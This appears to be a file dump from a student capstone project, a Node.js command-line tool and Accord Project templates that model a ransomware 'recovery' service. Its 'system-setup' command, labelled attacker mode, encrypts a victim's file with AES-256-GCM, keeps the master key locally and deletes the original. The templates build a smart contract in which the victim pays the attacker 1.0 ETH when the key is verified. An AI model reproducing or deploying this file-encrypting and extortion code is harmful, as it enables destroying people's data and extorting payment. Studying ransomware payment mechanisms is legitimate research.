File: /opt/Capstone/commitment.txt
================================================================================
c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214
================================================================================

File: /opt/Capstone/file_collection.txt
================================================================================

================================================================================

File: /opt/Capstone/steps.txt
================================================================================

node recovery-cli.js system-setup --victim 1234 --file ./files/secret.pem

node recovery-cli.js generate-commitment --file encryption_data_1234.json --output commitment.txt


recovery-cli init \
  --template ./templates/ransomware-template \
  --commitment ./commitment.txt \
  --victim 1234 \
  --attacker 5678 \
  --output contract.json

================================================================================

File: /opt/Capstone/recovery-cli.js
================================================================================
#!/usr/bin/env node



const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { Command } = require('commander');
const CiceroCore = require('@accordproject/cicero-core');
const Template = CiceroCore.Template;
const Clause = CiceroCore.Clause;

const Engine = require('@accordproject/cicero-engine').Engine;

const program = new Command();

class RansomwareSystem {
    constructor() {
        this.databaseFile = 'master_keys.json';
    }

    async generateMasterKey(victimId) {
        try {
            let database = {};
            try {
                const data = await fs.readFile(this.databaseFile, 'utf8');
                database = JSON.parse(data);
                if (database[victimId]) {
                    return Buffer.from(database[victimId], 'hex');
                }
            } catch (err) {
                // File doesn't exist or is invalid, continue with new database
            }

            const masterKey = crypto.randomBytes(32);
            database[victimId] = masterKey.toString('hex');
            await fs.writeFile(this.databaseFile, JSON.stringify(database, null, 2));
            return masterKey;
        } catch (error) {
            throw new Error(`Failed to generate master key: ${error.message}`);
        }
    }

    async encryptFile(filePath, victimId, masterKey) {
        try {
            // Generate file ID
            const fileId = crypto.createHash('sha256')
                .update(filePath)
                .digest('hex');
            
            // Generate decryption key for this specific file
            const decryptionKey = crypto.createHash('sha256')
                .update(Buffer.concat([
                    masterKey,
                    Buffer.from(victimId),
                    Buffer.from(fileId)
                ]))
                .digest();

            // Read the file
            const fileContent = await fs.readFile(filePath);
            
            // Generate a random IV
            const iv = crypto.randomBytes(16);
            
            // Create cipher
            const cipher = crypto.createCipheriv('aes-256-gcm', decryptionKey, iv);
            
            // Encrypt the data
            let encrypted = cipher.update(fileContent);
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            
            // Get the auth tag
            const authTag = cipher.getAuthTag();

            // Create the final encrypted file
            const encryptedFilePath = `${filePath}.encrypted`;
            
            // Write the IV, authTag and encrypted data
            await fs.writeFile(
                encryptedFilePath,
                Buffer.concat([iv, authTag, encrypted])
            );

            return { fileId, encryptedFilePath };
        } catch (error) {
            throw new Error(`Failed to encrypt file: ${error.message}`);
        }
    }

    generateCommitment(masterKey) {
        return crypto.createHash('sha256')
            .update(masterKey)
            .digest('hex');
    }
}

// Setup Commander.js
program
    .name('recovery-cli')
    .description('Ransomware Recovery Service CLI')
    .version('1.0.0');

program
    .command('system-setup')
    .description('Initialize the system and encrypt file (Attacker mode)')
    .requiredOption('-v, --victim <id>', 'Victim ID')
    .requiredOption('-f, --file <path>', 'File to encrypt')
    .action(async (options) => {
        try {
            const system = new RansomwareSystem();
            
            // Generate master key and encrypt file
            const masterKey = await system.generateMasterKey(options.victim);
            const { fileId, encryptedFilePath } = await system.encryptFile(options.file, options.victim, masterKey);
            
            // Generate commitment
            const commitment = system.generateCommitment(masterKey);

            // Save encryption data with commitment included
            const encryptionData = {
                victimId: options.victim,
                fileId: fileId,
                encryptedFile: encryptedFilePath,
                commitment: commitment // Include commitment in encryption data
            };

            const encryptionDataFile = `encryption_data_${options.victim}.json`;
            await fs.writeFile(
                encryptionDataFile, 
                JSON.stringify(encryptionData, null, 2)
            );

            // Delete original file
            await fs.unlink(options.file);

            console.log('System setup complete:');
            console.log('- File encrypted:', encryptedFilePath);
            console.log('- Encryption data (with commitment) saved to:', encryptionDataFile);
            console.log('- Master key stored in:', system.databaseFile);
            console.log('- Original file deleted');
        } catch (error) {
            console.error('Error during setup:', error.message);
            process.exit(1);
        }
    });

// Remove any existing 'init' command definitions

// Add this command definition
program
    .command('init')
    .description('Initialize a new contract from template')
    .requiredOption('--template <path>', 'Path to template directory')
    .requiredOption('--commitment <path>', 'Path to commitment file')
    .requiredOption('--victim <id>', 'Victim ID')
    .requiredOption('--attacker <id>', 'Attacker ID')
    .requiredOption('--output <path>', 'Output contract JSON path')
    .action(async (options) => {
        try {
            console.log('Reading commitment from:', options.commitment);
            const commitment = await fs.readFile(options.commitment, 'utf8');

            console.log('Loading template from:', options.template);
            const template = await Template.fromDirectory(options.template);
            
            console.log('Template loaded successfully');

            // Generate contract ID
            const contractId = crypto.randomBytes(16).toString('hex');

            // Create contract data
            const data = {
                '$class': 'org.accordproject.ransomware.recovery.RansomwareContract',
                '$identifier': contractId,
                'buyer': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.victim,
                    'name': `Victim ${options.victim}`
                },
                'seller': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.attacker,
                    'name': `Attacker ${options.attacker}`
                },
                'paymentAmount': {
                    '$class': 'org.accordproject.money.MonetaryAmount',
                    'doubleValue': 1.0,
                    'currencyCode': 'ETH'
                },
                'fileCommitment': commitment.trim()
            };

            // Create contract JSON
            const contractJson = {
                contract: data,
                state: {
                    '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                    'status': {
                        '$class': 'org.accordproject.ransomware.recovery.ContractStatus',
                        '$identifier': 'CREATED'
                    }
                }
            };

            // Write to file
            await fs.writeFile(
                options.output,
                JSON.stringify(contractJson, null, 2)
            );

            console.log('Contract initialization complete:');
            console.log('- Contract created with ID:', contractId);
            console.log('- Contract created for victim:', options.victim);
            console.log('- Saved to:', options.output);

        } catch (error) {
            console.error('Error initializing contract:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });
    program.parse();

================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar.tem.md
================================================================================
Upon verification of the provided master key against commitment ({{fileCommitment}}), {{buyer}} shall pay to {{seller}} the agreed amount ({{ransomAmount}}).

================================================================================

File: /opt/Capstone/templates/ransomware-template/.cucumber.js
================================================================================
require('@accordproject/cicero-test').Steps;

================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================

File: /opt/Capstone/templates/ransomware-template/text/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================

File: /opt/Capstone/templates/ransomware-template/text/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================

